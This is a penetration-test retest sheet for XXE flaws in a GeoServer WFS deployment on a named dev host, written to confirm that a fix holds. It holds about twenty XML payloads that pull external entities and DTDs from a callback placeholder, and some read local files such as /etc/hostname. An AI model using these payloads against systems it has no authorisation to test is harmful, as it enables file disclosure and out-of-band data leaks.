# GeoServer WFS XXE Retest Sheet

Use this when the previous issue also affected WFS. WFS has several XML POST operations, so do not stop at WMS if WMS is blocked.

Placeholders:

```text
BASE=https://amap.dev.airmiles.ai/geoserver
HOST=amap.dev.airmiles.ai
CB=http://<your-oast-or-collaborator-id>
WORKSPACE=<known_workspace>
TYPENAME=<known_workspace>:<known_layer>
```

Use a unique callback path per test, such as:

```text
CB/wfs-getcap-1
CB/wfs-dft-1
CB/wfs-gf110-1
CB/wfs-gf200-1
```

## WFS Endpoints

Test these endpoint shapes:

```text
[ ] POST /geoserver/wfs
[ ] POST /geoserver/ows
[ ] POST /geoserver/ows?service=WFS
[ ] POST /geoserver/ows?service=WFS&version=1.0.0
[ ] POST /geoserver/ows?service=WFS&version=1.1.0
[ ] POST /geoserver/ows?service=WFS&version=2.0.0
[ ] POST /geoserver/<workspace>/wfs
[ ] POST /geoserver/<workspace>/ows
[ ] POST /geoserver/<workspace>/ows?service=WFS
```

## Header Variants

Run the strongest WFS payloads with these:

```text
[ ] Content-Type: application/xml
[ ] Content-Type: text/xml
[ ] Content-Type: application/xml; charset=UTF-8
[ ] Content-Type: text/xml; charset=UTF-8
[ ] Accept: application/xml
[ ] Accept: text/xml
```

## Strongest WFS Payloads

### WFS-P1: GetCapabilities Parameter Entity

```xml
<?xml version="1.0"?>
<!DOCTYPE wfs:GetCapabilities [
  <!ENTITY % ping SYSTEM "CB/wfs-p1.dtd">
  %ping;
]>
<wfs:GetCapabilities service="WFS" version="1.1.0"
  xmlns:wfs="http://www.opengis.net/wfs"/>
```

### WFS-P2: GetCapabilities General Entity

```xml
<?xml version="1.0"?>
<!DOCTYPE wfs:GetCapabilities [
  <!ENTITY xxe SYSTEM "CB/wfs-p2">
]>
<wfs:GetCapabilities service="WFS" version="1.1.0"
  xmlns:wfs="http://www.opengis.net/wfs"
  updateSequence="&xxe;"/>
```

### WFS-P3: DescribeFeatureType Parameter Entity

```xml
<?xml version="1.0"?>
<!DOCTYPE wfs:DescribeFeatureType [
  <!ENTITY % ping SYSTEM "CB/wfs-p3.dtd">
  %ping;
]>
<wfs:DescribeFeatureType service="WFS" version="1.1.0"
  xmlns:wfs="http://www.opengis.net/wfs">
  <wfs:TypeName>TYPENAME</wfs:TypeName>
</wfs:DescribeFeatureType>
```

### WFS-P4: DescribeFeatureType Entity in TypeName

```xml
<?xml version="1.0"?>
<!DOCTYPE wfs:DescribeFeatureType [
  <!ENTITY xxe SYSTEM "CB/wfs-p4">
]>
<wfs:DescribeFeatureType service="WFS" version="1.1.0"
  xmlns:wfs="http://www.opengis.net/wfs">
  <wfs:TypeName>&xxe;</wfs:TypeName>
</wfs:DescribeFeatureType>
```

### WFS-P5: WFS 1.0.0 GetFeature

```xml
<?xml version="1.0"?>
<!DOCTYPE wfs:GetFeature [
  <!ENTITY % ping SYSTEM "CB/wfs-p5.dtd">
  %ping;
]>
<wfs:GetFeature service="WFS" version="1.0.0"
  xmlns:wfs="http://www.opengis.net/wfs"
  xmlns:ogc="http://www.opengis.net/ogc">
  <wfs:Query typeName="TYPENAME"/>
</wfs:GetFeature>
```

### WFS-P6: WFS 1.1.0 GetFeature

```xml
<?xml version="1.0"?>
<!DOCTYPE wfs:GetFeature [
  <!ENTITY % ping SYSTEM "CB/wfs-p6.dtd">
  %ping;
]>
<wfs:GetFeature service="WFS" version="1.1.0"
  xmlns:wfs="http://www.opengis.net/wfs"
  xmlns:ogc="http://www.opengis.net/ogc">
  <wfs:Query typeName="TYPENAME"/>
</wfs:GetFeature>
```

### WFS-P7: WFS 2.0.0 GetFeature

```xml
<?xml version="1.0"?>
<!DOCTYPE wfs:GetFeature [
  <!ENTITY % ping SYSTEM "CB/wfs-p7.dtd">
  %ping;
]>
<wfs:GetFeature service="WFS" version="2.0.0"
  xmlns:wfs="http://www.opengis.net/wfs/2.0">
  <wfs:Query typeNames="TYPENAME"/>
</wfs:GetFeature>
```

### WFS-P8: WFS 2.0.0 Entity in `typeNames`

```xml
<?xml version="1.0"?>
<!DOCTYPE wfs:GetFeature [
  <!ENTITY xxe SYSTEM "CB/wfs-p8">
]>
<wfs:GetFeature service="WFS" version="2.0.0"
  xmlns:wfs="http://www.opengis.net/wfs/2.0">
  <wfs:Query typeNames="&xxe;"/>
</wfs:GetFeature>
```

### WFS-P9: Filter Literal Entity

```xml
<?xml version="1.0"?>
<!DOCTYPE wfs:GetFeature [
  <!ENTITY xxe SYSTEM "CB/wfs-p9">
]>
<wfs:GetFeature service="WFS" version="1.1.0"
  xmlns:wfs="http://www.opengis.net/wfs"
  xmlns:ogc="http://www.opengis.net/ogc">
  <wfs:Query typeName="TYPENAME">
    <ogc:Filter>
      <ogc:PropertyIsEqualTo>
        <ogc:PropertyName>name</ogc:PropertyName>
        <ogc:Literal>&xxe;</ogc:Literal>
      </ogc:PropertyIsEqualTo>
    </ogc:Filter>
  </wfs:Query>
</wfs:GetFeature>
```

### WFS-P10: Filter PropertyName Entity

```xml
<?xml version="1.0"?>
<!DOCTYPE wfs:GetFeature [
  <!ENTITY xxe SYSTEM "CB/wfs-p10">
]>
<wfs:GetFeature service="WFS" version="1.1.0"
  xmlns:wfs="http://www.opengis.net/wfs"
  xmlns:ogc="http://www.opengis.net/ogc">
  <wfs:Query typeName="TYPENAME">
    <ogc:Filter>
      <ogc:PropertyIsEqualTo>
        <ogc:PropertyName>&xxe;</ogc:PropertyName>
        <ogc:Literal>test</ogc:Literal>
      </ogc:PropertyIsEqualTo>
    </ogc:Filter>
  </wfs:Query>
</wfs:GetFeature>
```

### WFS-P11: BBOX Filter Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE wfs:GetFeature [
  <!ENTITY % ping SYSTEM "CB/wfs-p11.dtd">
  %ping;
]>
<wfs:GetFeature service="WFS" version="1.1.0"
  xmlns:wfs="http://www.opengis.net/wfs"
  xmlns:ogc="http://www.opengis.net/ogc"
  xmlns:gml="http://www.opengis.net/gml">
  <wfs:Query typeName="TYPENAME">
    <ogc:Filter>
      <ogc:BBOX>
        <ogc:PropertyName>the_geom</ogc:PropertyName>
        <gml:Envelope srsName="EPSG:4326">
          <gml:lowerCorner>0 0</gml:lowerCorner>
          <gml:upperCorner>1 1</gml:upperCorner>
        </gml:Envelope>
      </ogc:BBOX>
    </ogc:Filter>
  </wfs:Query>
</wfs:GetFeature>
```

### WFS-P12: WFS 2.0 GetPropertyValue

```xml
<?xml version="1.0"?>
<!DOCTYPE wfs:GetPropertyValue [
  <!ENTITY % ping SYSTEM "CB/wfs-p12.dtd">
  %ping;
]>
<wfs:GetPropertyValue service="WFS" version="2.0.0"
  xmlns:wfs="http://www.opengis.net/wfs/2.0"
  valueReference="name">
  <wfs:Query typeNames="TYPENAME"/>
</wfs:GetPropertyValue>
```

### WFS-P13: WFS 2.0 Entity in `valueReference`

```xml
<?xml version="1.0"?>
<!DOCTYPE wfs:GetPropertyValue [
  <!ENTITY xxe SYSTEM "CB/wfs-p13">
]>
<wfs:GetPropertyValue service="WFS" version="2.0.0"
  xmlns:wfs="http://www.opengis.net/wfs/2.0"
  valueReference="&xxe;">
  <wfs:Query typeNames="TYPENAME"/>
</wfs:GetPropertyValue>
```

### WFS-P14: External DTD SYSTEM Identifier

```xml
<?xml version="1.0"?>
<!DOCTYPE wfs:GetFeature SYSTEM "CB/wfs-p14.dtd">
<wfs:GetFeature service="WFS" version="1.1.0"
  xmlns:wfs="http://www.opengis.net/wfs">
  <wfs:Query typeName="TYPENAME"/>
</wfs:GetFeature>
```

### WFS-P15: `schemaLocation` Fetch

```xml
<?xml version="1.0"?>
<wfs:GetFeature service="WFS" version="1.1.0"
  xmlns:wfs="http://www.opengis.net/wfs"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://www.opengis.net/wfs CB/wfs-p15.xsd">
  <wfs:Query typeName="TYPENAME"/>
</wfs:GetFeature>
```

### WFS-P16: XInclude

```xml
<?xml version="1.0"?>
<wfs:GetFeature service="WFS" version="1.1.0"
  xmlns:wfs="http://www.opengis.net/wfs"
  xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="CB/wfs-p16.txt" parse="text"/>
  <wfs:Query typeName="TYPENAME"/>
</wfs:GetFeature>
```

### WFS-P17: Linux Harmless File Reflection

```xml
<?xml version="1.0"?>
<!DOCTYPE wfs:GetFeature [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<wfs:GetFeature service="WFS" version="1.1.0"
  xmlns:wfs="http://www.opengis.net/wfs">
  <wfs:Query typeName="&xxe;"/>
</wfs:GetFeature>
```

### WFS-P18: Windows Harmless File Reflection

```xml
<?xml version="1.0"?>
<!DOCTYPE wfs:GetFeature [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<wfs:GetFeature service="WFS" version="1.1.0"
  xmlns:wfs="http://www.opengis.net/wfs">
  <wfs:Query typeName="&xxe;"/>
</wfs:GetFeature>
```

### WFS-P19: UTF-16 Encoded WFS Body

Send as actual UTF-16 bytes.

```xml
<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE wfs:GetCapabilities [
  <!ENTITY % ping SYSTEM "CB/wfs-p19.dtd">
  %ping;
]>
<wfs:GetCapabilities service="WFS" version="1.1.0"
  xmlns:wfs="http://www.opengis.net/wfs"/>
```

### WFS-P20: Nested Parameter Entity

```xml
<?xml version="1.0"?>
<!DOCTYPE wfs:GetCapabilities [
  <!ENTITY % a "<!ENTITY &#x25; b SYSTEM 'CB/wfs-p20.dtd'>">
  %a;
  %b;
]>
<wfs:GetCapabilities service="WFS" version="1.1.0"
  xmlns:wfs="http://www.opengis.net/wfs"/>
```

## Optional WFS-T Parser Checks

Use only if WFS-T is explicitly in scope and state-changing requests are permitted. Prefer intentionally invalid type names so XML parsing happens but no real feature is updated.

### WFS-T1: Transaction Wrapper, Invalid Type

```xml
<?xml version="1.0"?>
<!DOCTYPE wfs:Transaction [
  <!ENTITY % ping SYSTEM "CB/wfst-1.dtd">
  %ping;
]>
<wfs:Transaction service="WFS" version="1.1.0"
  xmlns:wfs="http://www.opengis.net/wfs">
  <wfs:Update typeName="invalid:invalid_feature_type">
    <wfs:Property>
      <wfs:Name>invalid</wfs:Name>
      <wfs:Value>invalid</wfs:Value>
    </wfs:Property>
  </wfs:Update>
</wfs:Transaction>
```

### WFS-T2: Transaction Entity in Value, Invalid Type

```xml
<?xml version="1.0"?>
<!DOCTYPE wfs:Transaction [
  <!ENTITY xxe SYSTEM "CB/wfst-2">
]>
<wfs:Transaction service="WFS" version="1.1.0"
  xmlns:wfs="http://www.opengis.net/wfs">
  <wfs:Update typeName="invalid:invalid_feature_type">
    <wfs:Property>
      <wfs:Name>invalid</wfs:Name>
      <wfs:Value>&xxe;</wfs:Value>
    </wfs:Property>
  </wfs:Update>
</wfs:Transaction>
```

## WFS Negative Control

For each parser route, send the same operation without `DOCTYPE`:

```xml
<?xml version="1.0"?>
<wfs:GetCapabilities service="WFS" version="1.1.0"
  xmlns:wfs="http://www.opengis.net/wfs"/>
```

## Closure Criteria for WFS

You can mark WFS XXE remediated if:

```text
[ ] WFS 1.0.0, 1.1.0, and 2.0.0 XML POST routes are tested
[ ] /wfs, /ows, and workspace WFS routes are tested
[ ] parameter entity, general entity, external DTD, schemaLocation, XInclude, file URI, UTF-16, and nested entity payloads are tested
[ ] no DNS or HTTP OAST callback arrives
[ ] no harmless local file content is reflected
[ ] errors say entity resolution/DOCTYPE/external access is blocked, or the service rejects safely before resolving entities
```
